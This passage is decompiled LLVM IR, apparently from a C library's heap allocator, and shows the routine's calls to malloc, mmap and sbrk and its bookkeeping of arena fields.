  %v1_b684 = add i32 %v4_b680, 44
  %v2_b684 = inttoptr i32 %v1_b684 to i32*
  %v3_b684 = load i32, i32* %v2_b684, align 4
  store i32 %v3_b684, i32* %ip.global-to-local, align 4
  %v1_b688 = add i32 %v3_b684, 4
  %v2_b688 = inttoptr i32 %v1_b688 to i32*
  %v3_b688 = load i32, i32* %v2_b688, align 4
  %v0_b68c = load i32, i32* @sl, align 4
  %v1_b68c = add i32 %v0_b68c, 16
  store i32 %v1_b68c, i32* %r1.global-to-local, align 4
  %v1_b690 = and i32 %v3_b688, -4
  store i32 %v1_b690, i32* %r3.global-to-local, align 4
  %v3_b694 = icmp ult i32 %v1_b690, %v1_b68c
  br i1 %v3_b694, label %dec_label_pc_b6c4, label %dec_label_pc_b6a0

dec_label_pc_b6a0:                                ; preds = %dec_label_pc_b678
  %v2_b6a0 = sub i32 %v1_b690, %v0_b68c
  %v2_b6a4 = add i32 %v0_b68c, %v3_b684
  store i32 %v2_b6a4, i32* %r1.global-to-local, align 4
  %v1_b6a8 = or i32 %v2_b6a0, 1
  store i32 %v1_b6a8, i32* %r3.global-to-local, align 4
  %v1_b6ac = or i32 %v0_b68c, 1
  store i32 %v1_b6ac, i32* %r2.global-to-local, align 4
  %v1_b6b0 = add i32 %v3_b684, 8
  store i32 %v1_b6b0, i32* %r4.global-to-local, align 4
  store i32 %v1_b6ac, i32* %v2_b688, align 4
  %v0_b6b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b6b8 = load i32, i32* @r0, align 4
  %v2_b6b8 = add i32 %v1_b6b8, 44
  %v3_b6b8 = inttoptr i32 %v2_b6b8 to i32*
  store i32 %v0_b6b8, i32* %v3_b6b8, align 4
  %v0_b6bc = load i32, i32* %r3.global-to-local, align 4
  %v1_b6bc = load i32, i32* %r1.global-to-local, align 4
  %v2_b6bc = add i32 %v1_b6bc, 4
  %v3_b6bc = inttoptr i32 %v2_b6bc to i32*
  store i32 %v0_b6bc, i32* %v3_b6bc, align 4
  br label %dec_label_pc_bac4

dec_label_pc_b6c4:                                ; preds = %dec_label_pc_b678
  %v1_b6c4 = inttoptr i32 %v4_b680 to i32*
  %v2_b6c4 = load i32, i32* %v1_b6c4, align 4
  store i32 %v2_b6c4, i32* %r3.global-to-local, align 4
  %v1_b6c8 = and i32 %v2_b6c4, 2
  store i32 %v1_b6c8, i32* %ip.global-to-local, align 4
  %v2_b6c8 = icmp eq i32 %v1_b6c8, 0
  %v1_b6cc = add i32 %v4_b680, 860
  %v2_b6cc = inttoptr i32 %v1_b6cc to i32*
  %v3_b6cc = load i32, i32* %v2_b6cc, align 4
  store i32 %v3_b6cc, i32* %r1.global-to-local, align 4
  br i1 %v2_b6c8, label %dec_label_pc_b6e4, label %dec_label_pc_b6d4

dec_label_pc_b6d4:                                ; preds = %dec_label_pc_b6c4
  %v0_b6d4 = call i32 @__malloc_consolidate()
  %v0_b6d8 = load i32, i32* @sl, align 4
  %v1_b6d8 = add i32 %v0_b6d8, -7
  store i32 %v1_b6d8, i32* %r0.global-to-local, align 4
  %v1_b6dc = call i32 @malloc(i32 %v1_b6d8)
  store i32 %v1_b6dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bac0

dec_label_pc_b6e4:                                ; preds = %dec_label_pc_b6c4
  %v1_b6e4 = add i32 %v4_b680, 844
  %v2_b6e4 = inttoptr i32 %v1_b6e4 to i32*
  %v3_b6e4 = load i32, i32* %v2_b6e4, align 4
  store i32 %v3_b6e4, i32* %r3.global-to-local, align 4
  %v3_b6e8 = icmp ult i32 %v0_b68c, %v3_b6e4
  %v1_b6ec = add i32 %v3_b6cc, -1
  store i32 %v1_b6ec, i32* %sb.global-to-local, align 4
  br i1 %v3_b6e8, label %dec_label_pc_b7c0, label %dec_label_pc_b6f4

dec_label_pc_b6f4:                                ; preds = %dec_label_pc_b6e4
  %v1_b6f4 = add i32 %v4_b680, 852
  %v2_b6f4 = inttoptr i32 %v1_b6f4 to i32*
  %v3_b6f4 = load i32, i32* %v2_b6f4, align 4
  store i32 %v3_b6f4, i32* %r2.global-to-local, align 4
  %v1_b6f8 = add i32 %v4_b680, 848
  %v2_b6f8 = inttoptr i32 %v1_b6f8 to i32*
  %v3_b6f8 = load i32, i32* %v2_b6f8, align 4
  store i32 %v3_b6f8, i32* %r3.global-to-local, align 4
  %v6_b700 = icmp slt i32 %v3_b6f8, %v3_b6f4
  br i1 %v6_b700, label %dec_label_pc_b704, label %dec_label_pc_b7c0

dec_label_pc_b704:                                ; preds = %dec_label_pc_b6f4
  %v1_b704 = add i32 %v0_b68c, 10
  %v2_b708 = add i32 %v1_b704, %v3_b6cc
  store i32 %v2_b708, i32* %r3.global-to-local, align 4
  %v2_b70c = sub i32 0, %v3_b6cc
  %v3_b70c = and i32 %v2_b708, %v2_b70c
  store i32 %v3_b70c, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_b70c, %v0_b68c
  br i1 %tmp211, label %dec_label_pc_b718, label %dec_label_pc_b7c0

dec_label_pc_b718:                                ; preds = %dec_label_pc_b704
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_b70c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_b730 = call i32 @mmap(i32 0, i32 %v3_b70c, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_b730, i32* %r0.global-to-local, align 4
  %v7_b734 = icmp eq i32 %v6_b730, -1
  br i1 %v7_b734, label %dec_label_pc_b718.dec_label_pc_b7c0_crit_edge, label %dec_label_pc_b73c

dec_label_pc_b718.dec_label_pc_b7c0_crit_edge:    ; preds = %dec_label_pc_b718
  %v1_b7e4.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_b7c0

dec_label_pc_b73c:                                ; preds = %dec_label_pc_b718
  %v1_b73c = urem i32 %v6_b730, 8
  store i32 %v1_b73c, i32* %r2.global-to-local, align 4
  %v2_b73c = icmp eq i32 %v1_b73c, 0
  br i1 %v2_b73c, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_b73c
  %v2_b740 = sub nsw i32 8, %v1_b73c
  store i32 %v2_b740, i32* %r3.global-to-local, align 4
  %v2_b744 = load i32, i32* @r4, align 4
  %v3_b744 = sub i32 %v2_b744, %v2_b740
  %v3_b748 = add i32 %v2_b740, %v6_b730
  store i32 %v3_b748, i32* %lr.global-to-local, align 4
  %v2_b750 = or i32 %v3_b744, 2
  store i32 %v2_b750, i32* %r2.global-to-local, align 4
  %v5_b758 = inttoptr i32 %v3_b748 to i32*
  store i32 %v2_b740, i32* %v5_b758, align 4
  %v1_b75c = load i32, i32* %r2.global-to-local, align 4
  %v2_b75c = load i32, i32* %lr.global-to-local, align 4
  %v3_b75c = add i32 %v2_b75c, 4
  %v4_b75c = inttoptr i32 %v3_b75c to i32*
  store i32 %v1_b75c, i32* %v4_b75c, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_b73c
  store i32 %v6_b730, i32* %lr.global-to-local, align 4
  %v1_b75447 = load i32, i32* @r4, align 4
  %v2_b75448 = or i32 %v1_b75447, 2
  store i32 %v2_b75448, i32* %r3.global-to-local, align 4
  %v3_b760 = inttoptr i32 %v6_b730 to i32*
  store i32 0, i32* %v3_b760, align 4
  %v1_b764 = load i32, i32* %r3.global-to-local, align 4
  %v2_b764 = load i32, i32* %lr.global-to-local, align 4
  %v3_b764 = add i32 %v2_b764, 4
  %v4_b764 = inttoptr i32 %v3_b764 to i32*
  store i32 %v1_b764, i32* %v4_b764, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_b770 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  store i32 %v4_b770, i32* %ip.global-to-local, align 4
  %v1_b774 = add i32 %v4_b770, 848
  %v2_b774 = inttoptr i32 %v1_b774 to i32*
  %v3_b774 = load i32, i32* %v2_b774, align 4
  store i32 %v3_b774, i32* %r3.global-to-local, align 4
  %v1_b778 = add i32 %v4_b770, 856
  %v2_b778 = inttoptr i32 %v1_b778 to i32*
  %v3_b778 = load i32, i32* %v2_b778, align 4
  store i32 %v3_b778, i32* %r2.global-to-local, align 4
  %v1_b77c = add i32 %v3_b774, 1
  store i32 %v1_b77c, i32* %r3.global-to-local, align 4
  %v7_b784 = icmp sgt i32 %v1_b77c, %v3_b778
  br i1 %v7_b784, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_b77c, i32* %v2_b778, align 4
  %v0_b788.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_b788.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_b788 = phi i32 [ %v4_b770, %.thread27 ], [ %v1_b788.pre, %bb147 ]
  %v0_b788 = phi i32 [ %v1_b77c, %.thread27 ], [ %v0_b788.pre, %bb147 ]
  %v2_b788 = add i32 %v1_b788, 848
  %v3_b788 = inttoptr i32 %v2_b788 to i32*
  store i32 %v0_b788, i32* %v3_b788, align 4
  %v0_b78c = load i32, i32* %ip.global-to-local, align 4
  %v1_b78c = add i32 %v0_b78c, 868
  %v2_b78c = inttoptr i32 %v1_b78c to i32*
  %v3_b78c = load i32, i32* %v2_b78c, align 4
  store i32 %v3_b78c, i32* %r3.global-to-local, align 4
  %v1_b790 = add i32 %v0_b78c, 880
  %v2_b790 = inttoptr i32 %v1_b790 to i32*
  %v3_b790 = load i32, i32* %v2_b790, align 4
  store i32 %v3_b790, i32* %r2.global-to-local, align 4
  %v0_b794 = load i32, i32* @r4, align 4
  %v2_b794 = add i32 %v0_b794, %v3_b78c
  store i32 %v2_b794, i32* %r1.global-to-local, align 4
  %v1_b798 = add i32 %v0_b78c, 872
  %v2_b798 = inttoptr i32 %v1_b798 to i32*
  %v3_b798 = load i32, i32* %v2_b798, align 4
  store i32 %v3_b798, i32* %r3.global-to-local, align 4
  %v1_b7a0 = add i32 %v0_b78c, 884
  %v2_b7a0 = inttoptr i32 %v1_b7a0 to i32*
  %v3_b7a0 = load i32, i32* %v2_b7a0, align 4
  store i32 %v3_b7a0, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_b794, %v3_b790
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_b794, i32* %v2_b790, align 4
  %v0_b7a8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_b7a8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_b7a8 = phi i32 [ %v0_b78c, %bb148 ], [ %v1_b7a8.pre, %bb149 ]
  %v0_b7a8 = phi i32 [ %v2_b794, %bb148 ], [ %v0_b7a8.pre, %bb149 ]
  %v2_b7a8 = add i32 %v1_b7a8, 868
  %v3_b7a8 = inttoptr i32 %v2_b7a8 to i32*
  store i32 %v0_b7a8, i32* %v3_b7a8, align 4
  %v0_b7ac = load i32, i32* %r1.global-to-local, align 4
  %v1_b7ac = load i32, i32* %r3.global-to-local, align 4
  %v2_b7ac = add i32 %v1_b7ac, %v0_b7ac
  store i32 %v2_b7ac, i32* %r1.global-to-local, align 4
  %v1_b7b0 = load i32, i32* %r2.global-to-local, align 4
  %v0_b7b4 = load i32, i32* %lr.global-to-local, align 4
  %v1_b7b4 = add i32 %v0_b7b4, 8
  store i32 %v1_b7b4, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_b7ac, %v1_b7b0
  br i1 %tmp213, label %bb151, label %dec_label_pc_bac0

bb151:                                            ; preds = %bb150
  %v5_b7b8 = load i32, i32* %ip.global-to-local, align 4
  %v6_b7b8 = add i32 %v5_b7b8, 884
  %v7_b7b8 = inttoptr i32 %v6_b7b8 to i32*
  store i32 %v2_b7ac, i32* %v7_b7b8, align 4
  br label %dec_label_pc_bac0

dec_label_pc_b7c0:                                ; preds = %dec_label_pc_b704, %dec_label_pc_b6e4, %dec_label_pc_b718.dec_label_pc_b7c0_crit_edge, %dec_label_pc_b6f4
  %v1_b7e4 = phi i32 [ %v1_b7e4.pre, %dec_label_pc_b718.dec_label_pc_b7c0_crit_edge ], [ %v0_b68c, %dec_label_pc_b6f4 ], [ %v0_b68c, %dec_label_pc_b6e4 ], [ %v0_b68c, %dec_label_pc_b704 ]
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %ip.global-to-local, align 4
  %v4_b7c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  store i32 %v4_b7c8, i32* %r3.global-to-local, align 4
  %v1_b7cc = add i32 %v4_b7c8, 44
  %v2_b7cc = inttoptr i32 %v1_b7cc to i32*
  %v3_b7cc = load i32, i32* %v2_b7cc, align 4
  store i32 %v3_b7cc, i32* %r0.global-to-local, align 4
  %v1_b7d0 = add i32 %v4_b7c8, 864
  %v2_b7d0 = inttoptr i32 %v1_b7d0 to i32*
  %v3_b7d0 = load i32, i32* %v2_b7d0, align 4
  store i32 %v3_b7d0, i32* %r2.global-to-local, align 4
  %v1_b7d4 = add i32 %v4_b7c8, 840
  %v2_b7d4 = inttoptr i32 %v1_b7d4 to i32*
  %v3_b7d4 = load i32, i32* %v2_b7d4, align 4
  store i32 %v3_b7d4, i32* %r3.global-to-local, align 4
  %v1_b7d8 = add i32 %v3_b7cc, 4
  %v2_b7d8 = inttoptr i32 %v1_b7d8 to i32*
  %v3_b7d8 = load i32, i32* %v2_b7d8, align 4
  store i32 %v3_b7d8, i32* %r1.global-to-local, align 4
  %v1_b7e0 = urem i32 %v3_b7d0, 2
  %v2_b7e0 = icmp eq i32 %v1_b7e0, 0
  %v1_b7dc = add i32 %v1_b7e4, 16
  %v2_b7e4 = add i32 %v1_b7dc, %v3_b7d4
  store i32 %v2_b7e4, i32* %r3.global-to-local, align 4
  %v1_b7e8 = and i32 %v3_b7d8, -4
  store i32 %v1_b7e8, i32* @r8, align 4
  br i1 %v2_b7e0, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_b7c0
  %v3_b7ec = sub i32 %v2_b7e4, %v1_b7e8
  store i32 %v3_b7ec, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_b7c0, %bb152
  %v0_b7f0 = phi i32 [ %v2_b7e4, %dec_label_pc_b7c0 ], [ %v3_b7ec, %bb152 ]
  %v1_b7f0 = load i32, i32* %sb.global-to-local, align 4
  %v2_b7f0 = add i32 %v1_b7f0, %v0_b7f0
  store i32 %v2_b7f0, i32* %r3.global-to-local, align 4
  %v1_b7f4 = sub i32 -1, %v1_b7f0
  store i32 %v1_b7f4, i32* %fp.global-to-local, align 4
  %v2_b7f8 = and i32 %v2_b7f0, %v1_b7f4
  store i32 %v2_b7f8, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_b7f8, 1
  br i1 %tmp154, label %dec_label_pc_b81c, label %dec_label_pc_b808

dec_label_pc_b808:                                ; preds = %bb153
  store i32 %v2_b7f8, i32* %r0.global-to-local, align 4
  %v1_b80c = call i32 @__GI_sbrk(i32 %v2_b7f8)
  store i32 %v1_b80c, i32* %r0.global-to-local, align 4
  %v3_b810 = icmp eq i32 %v1_b80c, -1
  store i32 %v1_b80c, i32* @r4, align 4
  br i1 %v3_b810, label %dec_label_pc_b81c, label %dec_label_pc_b888

dec_label_pc_b81c:                                ; preds = %dec_label_pc_b808, %bb153
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r1.global-to-local, align 4
  %v4_b824 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  store i32 %v4_b824, i32* %r6.global-to-local, align 4
  %v1_b828 = add i32 %v4_b824, 864
  %v2_b828 = inttoptr i32 %v1_b828 to i32*
  %v3_b828 = load i32, i32* %v2_b828, align 4
  store i32 %v3_b828, i32* %r3.global-to-local, align 4
  %v1_b82c = urem i32 %v3_b828, 2
  %v2_b82c = icmp eq i32 %v1_b82c, 0
  br i1 %v2_b82c, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_b81c
  %v1_b830 = load i32, i32* @r8, align 4
  %v2_b830 = load i32, i32* %sb.global-to-local, align 4
  %v3_b830 = add i32 %v2_b830, %v1_b830
  %v2_b834 = load i32, i32* @r5, align 4
  %v3_b834 = add i32 %v3_b830, %v2_b834
  store i32 %v3_b834, i32* %r3.global-to-local, align 4
  %v2_b838 = load i32, i32* %fp.global-to-local, align 4
  %v3_b838 = and i32 %v2_b838, %v3_b834
  store i32 %v3_b838, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_b81c
  %v0_b83c.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_b83c = phi i32 [ %v0_b83c.pr, %.thread29thread-pre-split ], [ %v3_b838, %bb155 ]
  %v2_b83c = icmp ugt i32 %v0_b83c, 1048575
  br i1 %v2_b83c, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_b854 = phi i32 [ %v0_b83c, %.thread29 ], [ 1048576, %bb156 ]
  %v1_b844 = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_b854, %v1_b844
  br i1 %tmp214, label %dec_label_pc_b84c, label %dec_label_pc_bab0

dec_label_pc_b84c:                                ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_b854, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_b868 = call i32 @mmap(i32 0, i32 %v0_b854, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_b868, i32* %r0.global-to-local, align 4
  %v3_b86c = icmp eq i32 %v6_b868, -1
  %v8_b86c = icmp eq i32 %v6_b868, -1
  store i32 %v6_b868, i32* @r4, align 4
  br i1 %v8_b86c, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_b84c
  %v1_b874 = load i32, i32* %r6.global-to-local, align 4
  %v2_b874 = add i32 %v1_b874, 864
  %v3_b874 = inttoptr i32 %v2_b874 to i32*
  %v4_b874 = load i32, i32* %v3_b874, align 4
  %v2_b878 = load i32, i32* @r5, align 4
  %v3_b878 = add i32 %v2_b878, %v6_b868
  store i32 %v3_b878, i32* %r0.global-to-local, align 4
  %v2_b87c = and i32 %v4_b874, -2
  store i32 %v2_b87c, i32* %r3.global-to-local, align 4
  store i32 %v2_b87c, i32* %v3_b874, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_b84c, %bb158
  br i1 %v3_b86c, label %dec_label_pc_b888, label %dec_label_pc_b88c

dec_label_pc_b888:                                ; preds = %.thread32, %dec_label_pc_b808
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b88c

dec_label_pc_b88c:                                ; preds = %.thread32, %dec_label_pc_b888
  %v0_b88c = load i32, i32* @r4, align 4
  %v7_b88c = icmp eq i32 %v0_b88c, -1
  br i1 %v7_b88c, label %dec_label_pc_bab0, label %dec_label_pc_b894

dec_label_pc_b894:                                ; preds = %dec_label_pc_b88c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r2.global-to-local, align 4
  %v4_b89c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  store i32 %v4_b89c, i32* %ip.global-to-local, align 4
  store i32 %v3_b7cc, i32* %r2.global-to-local, align 4
  %v1_b8a4 = add i32 %v4_b89c, 872
  %v2_b8a4 = inttoptr i32 %v1_b8a4 to i32*
  %v3_b8a4 = load i32, i32* %v2_b8a4, align 4
  %v1_b8a8 = load i32, i32* @r8, align 4
  %v2_b8a8 = add i32 %v1_b8a8, %v3_b7cc
  store i32 %v2_b8a8, i32* %r1.global-to-local, align 4
  %v0_b8ac = load i32, i32* @r5, align 4
  %v2_b8ac = add i32 %v0_b8ac, %v3_b8a4
  store i32 %v2_b8ac, i32* %r3.global-to-local, align 4
  %v9_b8b0 = icmp eq i32 %v0_b88c, %v2_b8a8
  br i1 %v9_b8b0, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_b894
  store i32 %v2_b8ac, i32* %v2_b8a4, align 4
  br label %dec_label_pc_b8cc

bb159:                                            ; preds = %dec_label_pc_b894
  %v1_b8b4 = load i32, i32* %r0.global-to-local, align 4
  %v8_b8b4 = icmp eq i32 %v1_b8b4, -1
  store i32 %v2_b8ac, i32* %v2_b8a4, align 4
  br i1 %v8_b8b4, label %.thread34, label %dec_label_pc_b8cc

.thread34:                                        ; preds = %bb159
  %v1_b8bc = load i32, i32* @r5, align 4
  %v2_b8bc = load i32, i32* @r8, align 4
  %v3_b8bc = add i32 %v2_b8bc, %v1_b8bc
  %v2_b8c0 = or i32 %v3_b8bc, 1
  store i32 %v2_b8c0, i32* %r3.global-to-local, align 4
  %v2_b8c4 = load i32, i32* %r2.global-to-local, align 4
  %v3_b8c4 = add i32 %v2_b8c4, 4
  %v4_b8c4 = inttoptr i32 %v3_b8c4 to i32*
  store i32 %v2_b8c0, i32* %v4_b8c4, align 4
  br label %dec_label_pc_ba44

dec_label_pc_b8cc:                                ; preds = %bb159, %.thread122
  %v0_b8d0.pr = load i32, i32* @r8, align 4
  %v0_b8cc = load i32, i32* %ip.global-to-local, align 4
  %v1_b8cc = add i32 %v0_b8cc, 864
  %v2_b8cc = inttoptr i32 %v1_b8cc to i32*
  %v3_b8cc = load i32, i32* %v2_b8cc, align 4
  store i32 %v3_b8cc, i32* %r2.global-to-local, align 4
  %v2_b8d0 = icmp eq i32 %v0_b8d0.pr, 0
  br i1 %v2_b8d0, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_b8cc
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_b8cc
  %v2_b8d8 = urem i32 %v3_b8cc, 2
  store i32 %v2_b8d8, i32* %r3.global-to-local, align 4
  %v2_b8dc = icmp eq i32 %v2_b8d8, 0
  br i1 %v2_b8dc, label %.thread40, label %dec_label_pc_b8e4

dec_label_pc_b8e4:                                ; preds = %.thread36
  %v0_b8e4 = load i32, i32* @r4, align 4
  %v1_b8e4 = load i32, i32* %r1.global-to-local, align 4
  %v3_b8e4 = icmp ult i32 %v0_b8e4, %v1_b8e4
  br i1 %v3_b8e4, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_b8e4
  %v2_b8e8 = and i32 %v3_b8cc, -2
  store i32 %v2_b8e8, i32* %r3.global-to-local, align 4
  store i32 %v2_b8e8, i32* %v2_b8cc, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_b8e4, %.thread37, %.thread36, %bb160
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %ip.global-to-local, align 4
  %v4_b8f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  store i32 %v4_b8f8, i32* @r7, align 4
  %v1_b8fc = add i32 %v4_b8f8, 864
  %v2_b8fc = inttoptr i32 %v1_b8fc to i32*
  %v3_b8fc = load i32, i32* %v2_b8fc, align 4
  store i32 %v3_b8fc, i32* %r3.global-to-local, align 4
  %v1_b900 = urem i32 %v3_b8fc, 2
  store i32 %v1_b900, i32* @r6, align 4
  %v2_b900 = icmp eq i32 %v1_b900, 0
  br i1 %v2_b900, label %dec_label_pc_b994, label %dec_label_pc_b908

dec_label_pc_b908:                                ; preds = %.thread40
  %v0_b908 = load i32, i32* @r8, align 4
  %v2_b908 = icmp eq i32 %v0_b908, 0
  br i1 %v2_b908, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_b908
  %v2_b90c = add i32 %v4_b8f8, 872
  %v3_b90c = inttoptr i32 %v2_b90c to i32*
  %v4_b90c = load i32, i32* %v3_b90c, align 4
  store i32 %v4_b90c, i32* %r2.global-to-local, align 4
  %v1_b910 = load i32, i32* %r1.global-to-local, align 4
  %v2_b910 = load i32, i32* @r4, align 4
  %v3_b910 = sub i32 %v2_b910, %v1_b910
  %v3_b914 = add i32 %v3_b910, %v4_b90c
  store i32 %v3_b914, i32* %r3.global-to-local, align 4
  store i32 %v3_b914, i32* %v3_b90c, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_b908, %bb161
  %v0_b91c = load i32, i32* @r4, align 4
  %v1_b91c = urem i32 %v0_b91c, 8
  store i32 %v1_b91c, i32* %r3.global-to-local, align 4
  %v2_b91c = icmp eq i32 %v1_b91c, 0
  br i1 %v2_b91c, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_b920 = sub nsw i32 8, %v1_b91c
  store i32 %v2_b920, i32* %r3.global-to-local, align 4
  %v3_b924 = add i32 %v2_b920, %v0_b91c
  store i32 %v3_b924, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_b92c = phi i32 [ 0, %.thread43 ], [ %v2_b920, %bb162 ]
  %v1_b928 = load i32, i32* @r5, align 4
  %v2_b928 = add i32 %v1_b928, %v0_b91c
  store i32 %v2_b928, i32* @r6, align 4
  %v1_b92c = load i32, i32* @r8, align 4
  %v2_b92c = add i32 %v2_b928, %v0_b92c
  %v2_b930 = add i32 %v2_b92c, %v1_b92c
  store i32 %v2_b930, i32* %r1.global-to-local, align 4
  %v1_b934 = load i32, i32* %sb.global-to-local, align 4
  %v2_b934 = add i32 %v1_b934, %v2_b930
  %v1_b938 = load i32, i32* %fp.global-to-local, align 4
  %v2_b938 = and i32 %v1_b938, %v2_b934
  store i32 %v2_b938, i32* %r2.global-to-local, align 4
  %v2_b93c = sub i32 0, %v2_b928
  store i32 %v2_b93c, i32* %r3.global-to-local, align 4
  %v2_b940 = sub i32 %v2_b938, %v2_b928
  store i32 %v2_b940, i32* @r5, align 4
  store i32 %v2_b940, i32* %r0.global-to-local, align 4
  br i1 %v2_b91c, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_b91c, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_b94c = call i32 @__GI_sbrk(i32 %v2_b940)
  store i32 %v1_b94c, i32* %r0.global-to-local, align 4
  %v3_b950 = icmp eq i32 %v1_b94c, -1
  br i1 %v3_b950, label %dec_label_pc_b958, label %dec_label_pc_b968

dec_label_pc_b958:                                ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_b95c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_b95c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_b9c0

dec_label_pc_b968:                                ; preds = %bb164
  %v1_b968 = load i32, i32* @r4, align 4
  %v3_b968 = icmp ult i32 %v1_b94c, %v1_b968
  br i1 %v3_b968, label %dec_label_pc_b970, label %dec_label_pc_b9c0

dec_label_pc_b970:                                ; preds = %dec_label_pc_b968
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r0.global-to-local, align 4
  %v4_b978 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  store i32 %v4_b978, i32* %r2.global-to-local, align 4
  %v1_b97c = add i32 %v4_b978, 864
  %v2_b97c = inttoptr i32 %v1_b97c to i32*
  %v3_b97c = load i32, i32* %v2_b97c, align 4
  %v0_b980 = load i32, i32* @r6, align 4
  store i32 %v0_b980, i32* %r0.global-to-local, align 4
  %v1_b984 = and i32 %v3_b97c, -2
  store i32 %v1_b984, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_b984, i32* %v2_b97c, align 4
  br label %dec_label_pc_b9c0

dec_label_pc_b994:                                ; preds = %.thread40
  %v0_b994 = load i32, i32* %r0.global-to-local, align 4
  %v3_b994 = icmp eq i32 %v0_b994, -1
  br i1 %v3_b994, label %dec_label_pc_b99c, label %dec_label_pc_b9b8

dec_label_pc_b99c:                                ; preds = %dec_label_pc_b994
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_b9a0 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_b9a0, i32* %r0.global-to-local, align 4
  %v0_b9a4 = load i32, i32* @r7, align 4
  %v1_b9a4 = add i32 %v0_b9a4, 872
  %v2_b9a4 = inttoptr i32 %v1_b9a4 to i32*
  %v3_b9a4 = load i32, i32* %v2_b9a4, align 4
  store i32 %v3_b9a4, i32* %r2.global-to-local, align 4
  %v0_b9a8 = load i32, i32* @r4, align 4
  %v0_b9ac = load i32, i32* @r5, align 4
  %v2_b9a8 = add i32 %v3_b9a4, %v1_b9a0
  %v2_b9ac = sub i32 %v2_b9a8, %v0_b9a8
  %v2_b9b0 = sub i32 %v2_b9ac, %v0_b9ac
  store i32 %v2_b9b0, i32* %r3.global-to-local, align 4
  store i32 %v2_b9b0, i32* %v2_b9a4, align 4
  %v0_b9bc.pre = load i32, i32* @r6, align 4
